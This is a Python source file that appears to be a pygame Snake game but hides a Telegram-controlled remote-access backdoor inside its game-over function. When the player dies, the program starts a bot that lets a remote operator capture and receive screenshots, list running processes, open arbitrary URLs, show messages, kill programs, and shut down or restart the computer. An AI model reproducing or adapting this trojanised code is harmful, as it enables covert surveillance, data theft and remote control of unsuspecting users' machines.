from config.apiKey import ACCESS_TOKEN, ID_CHAT
from tkinter import messagebox
from telebot import TeleBot
from telebot import types
from io import BytesIO
from PIL import Image
import subprocess
import webbrowser
import pyautogui
import requests
import psutil
import pygame, sys, time, random

bot = TeleBot(ACCESS_TOKEN, parse_mode=None)

waiting_for_url = {}
waiting_for_text = {}
waiting_for_program_name = {}

# Difficulty settings
# Easy      ->  10
# Medium    ->  25
# Hard      ->  40
# Harder    ->  60
# Impossible->  120
difficulty = 25

# Window size
frame_size_x = 720
frame_size_y = 480

# Checks for errors encountered
check_errors = pygame.init()
# pygame.init() example output -> (6, 0)
# second number in tuple gives number of errors
if check_errors[1] > 0:
    print(f'[!] Had {check_errors[1]} errors when initialising game, exiting...')
    sys.exit(-1)
else:
    print('[+] Game successfully initialised')


# Initialise game window
pygame.display.set_caption('Snake Eater')
game_window = pygame.display.set_mode((frame_size_x, frame_size_y))


# Colors (R, G, B)
black = pygame.Color(0, 0, 0)
white = pygame.Color(255, 255, 255)
red = pygame.Color(255, 0, 0)
green = pygame.Color(0, 255, 0)
blue = pygame.Color(0, 0, 255)


# FPS (frames per second) controller
fps_controller = pygame.time.Clock()


# Game variables
snake_pos = [100, 50]
snake_body = [[100, 50], [100-10, 50], [100-(2*10), 50]]

food_pos = [random.randrange(1, (frame_size_x//10)) * 10, random.randrange(1, (frame_size_y//10)) * 10]
food_spawn = True

direction = 'RIGHT'
change_to = direction

score = 0


# Game Over
def game_over():
    my_font = pygame.font.SysFont('times new roman', 90)
    game_over_surface = my_font.render('YOU DIED', True, red)
    game_over_rect = game_over_surface.get_rect()
    game_over_rect.midtop = (frame_size_x/2, frame_size_y/4)
    game_window.fill(black)
    game_window.blit(game_over_surface, game_over_rect)
    show_score(0, red, 'times', 20)
    pygame.display.flip()
    time.sleep(3)
    pygame.quit()
    @bot.message_handler(["help","start"])
    def SendMessage(message):
        text = "My Device Is On 🟢"
        markup = types.InlineKeyboardMarkup()
        screenshot = markup.add(types.InlineKeyboardButton("Screenshot 🖥",callback_data="screenshot"))
        tasklist   = markup.add(types.InlineKeyboardButton("Tasklist 📱",callback_data="tasklist"))
        showInbox  = markup.add(types.InlineKeyboardButton("Show Text 📦",callback_data="showinbox"))
        url        = markup.add(types.InlineKeyboardButton("Open Url 〽️",callback_data="url"))
        killApp    = markup.add(types.InlineKeyboardButton("End Application 👏",callback_data="killapp"))
        shutdown   = markup.add(types.InlineKeyboardButton("Shutdown 🚀",callback_data="shutdown"))
        restart    = markup.add(types.InlineKeyboardButton("Restart 🛑",callback_data="restart"))
        bot.send_message(message.chat.id,text=text,reply_markup=markup)
    @bot.callback_query_handler(func=lambda call:True)
    def callback(call):
        if call.data == "screenshot":
            screenshot = pyautogui.screenshot()
            image_stream = BytesIO()
            screenshot.save(image_stream, format='PNG')
            image_stream.seek(0)

            # Gửi ảnh qua Telegram
            bot.send_photo(call.message.chat.id, image_stream, caption="Here's Screenshot !")
        elif call.data == "tasklist":
            running_apps = {proc.info['name'] for proc in psutil.process_iter(['pid', 'name'])}
            if running_apps:
                bot.send_message(call.message.chat.id, str('\n'.join(running_apps)))
            else:
                bot.send_message(call.message.chat.id, "Không có ứng dụng nào đang chạy.")
        elif call.data == "showinbox":
            bot.reply_to(call.message, "Nhập thông báo :")
            waiting_for_text[call.message.chat.id] = "Inbox"
        elif call.data == "url":
            bot.reply_to(call.message, "Nhập URL :")
            waiting_for_url[call.message.chat.id] = True
        elif call.data == "killapp":
            bot.reply_to(call.message, "Nhập tên chương trình để kết thúc : ")
            waiting_for_program_name[call.message.chat.id] = "KillApp"
        elif call.data == "shutdown":
            import os
            os.system("shutdown /s")
            bot.send_message(call.chat.message.id,"Shutdown thành công!")
        elif call.data == "restart":
            import os
            os.system("shutdown /r")
            bot.send_message(call.chat.message.id,"Shutdown thành công!")
        else:pass
    @bot.message_handler(func=lambda message: waiting_for_url.get(message.chat.id, False))
    def open_url(message):
        try:
            url = message.text
            webbrowser.open(url)
            bot.send_message(message.chat.id, f"Đã mở URL: {url}")
            waiting_for_url[message.chat.id] = False  # Đặt trạng thái chờ URL về False
        except Exception as e:
            bot.send_message(message.chat.id, f"Có lỗi xảy ra khi mở URL.")
    @bot.message_handler(func=lambda message: waiting_for_text.get(message.chat.id) == "Inbox")
    def show_inbox(message):
        messagebox.showinfo("Thông báo", message.text)
        waiting_for_text[message.chat.id] = None
    @bot.message_handler(func=lambda message: waiting_for_program_name.get(message.chat.id) == "KillApp")
    def end_application(message):
        try:
            program_name = message.text
            for proc in psutil.process_iter(['pid', 'name']):
                if program_name.lower() in proc.info['name'].lower():
                    psutil.Process(proc.info['pid']).terminate()
                    bot.send_message(message.chat.id, f"Đã kết thúc chương trình: {proc.info['name']}")
                    break
            else:
                bot.send_message(message.chat.id, f"Không tìm thấy chương trình có tên: {program_name}")
            waiting_for_program_name[message.chat.id] = None
        except Exception as e:
            bot.send_message(message.chat.id, f"Có lỗi xảy ra khi kết thúc chương trình.")
    if __name__ == "__main__":
        bot.infinity_polling()

    sys.exit()


# Score
def show_score(choice, color, font, size):
    score_font = pygame.font.SysFont(font, size)
    score_surface = score_font.render('Score : ' + str(score), True, color)
    score_rect = score_surface.get_rect()
    if choice == 1:
        score_rect.midtop = (frame_size_x/10, 15)
    else:
        score_rect.midtop = (frame_size_x/2, frame_size_y/1.25)
    game_window.blit(score_surface, score_rect)
    # pygame.display.flip()


# Main logic
while True:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pygame.quit()
            sys.exit()
        # Whenever a key is pressed down
        elif event.type == pygame.KEYDOWN:
            # W -> Up; S -> Down; A -> Left; D -> Right
            if event.key == pygame.K_UP or event.key == ord('w'):
                change_to = 'UP'
            if event.key == pygame.K_DOWN or event.key == ord('s'):
                change_to = 'DOWN'
            if event.key == pygame.K_LEFT or event.key == ord('a'):
                change_to = 'LEFT'
            if event.key == pygame.K_RIGHT or event.key == ord('d'):
                change_to = 'RIGHT'
            # Esc -> Create event to quit the game
            if event.key == pygame.K_ESCAPE:
                pygame.event.post(pygame.event.Event(pygame.QUIT))

    # Making sure the snake cannot move in the opposite direction instantaneously
    if change_to == 'UP' and direction != 'DOWN':
        direction = 'UP'
    if change_to == 'DOWN' and direction != 'UP':
        direction = 'DOWN'
    if change_to == 'LEFT' and direction != 'RIGHT':
        direction = 'LEFT'
    if change_to == 'RIGHT' and direction != 'LEFT':
        direction = 'RIGHT'

    # Moving the snake
    if direction == 'UP':
        snake_pos[1] -= 10
    if direction == 'DOWN':
        snake_pos[1] += 10
    if direction == 'LEFT':
        snake_pos[0] -= 10
    if direction == 'RIGHT':
        snake_pos[0] += 10

    # Snake body growing mechanism
    snake_body.insert(0, list(snake_pos))
    if snake_pos[0] == food_pos[0] and snake_pos[1] == food_pos[1]:
        score += 1
        food_spawn = False
    else:
        snake_body.pop()

    # Spawning food on the screen
    if not food_spawn:
        food_pos = [random.randrange(1, (frame_size_x//10)) * 10, random.randrange(1, (frame_size_y//10)) * 10]
    food_spawn = True

    # GFX
    game_window.fill(black)
    for pos in snake_body:
        # Snake body
        # .draw.rect(play_surface, color, xy-coordinate)
        # xy-coordinate -> .Rect(x, y, size_x, size_y)
        pygame.draw.rect(game_window, green, pygame.Rect(pos[0], pos[1], 10, 10))

    # Snake food
    pygame.draw.rect(game_window, white, pygame.Rect(food_pos[0], food_pos[1], 10, 10))

    # Game Over conditions
    # Getting out of bounds
    if snake_pos[0] < 0 or snake_pos[0] > frame_size_x-10:
        game_over()
    if snake_pos[1] < 0 or snake_pos[1] > frame_size_y-10:
        game_over()
    # Touching the snake body
    for block in snake_body[1:]:
        if snake_pos[0] == block[0] and snake_pos[1] == block[1]:
            game_over()

    show_score(1, white, 'consolas', 20)
    # Refresh game screen
    pygame.display.update()
    # Refresh rate
    fps_controller.tick(difficulty)
